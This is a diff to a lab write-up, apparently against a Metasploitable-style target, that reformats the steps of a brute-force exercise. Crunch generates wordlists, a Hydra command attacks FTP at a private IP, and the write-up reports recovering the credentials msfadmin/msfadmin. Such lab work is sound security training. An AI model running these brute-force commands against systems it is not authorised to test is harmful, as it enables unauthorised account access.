@@ -17,11 +17,18 @@ To simulate a brute-force attack using Hydra with a custom-generated wordlist.
 
 ### Wordlist Generation
 
+```
 - crunch 4 4 0123456789 -o wordlist.txt
+```
+
+```
 - crunch 6 6 abc123 -o wordlist.txt
+```
 
 ### Attack Execution
+```
 hydra -l msfadmin -P test.txt ftp://192.168.222.131
+```
 
 ## Command Breakdown
 -  `-l` : specifies the username
@@ -33,8 +40,10 @@ hydra -l msfadmin -P test.txt ftp://192.168.222.131
 - Initial attempts resulted in failed logins
 - A valid credential pair was successfully discovered:
 
+```
   Username: msfadmin  
-  Password: msfadmin  
+  Password: msfadmin
+```
 
 - This confirms that the target system is vulnerable to brute-force attacks due to weak authentication credentials
 
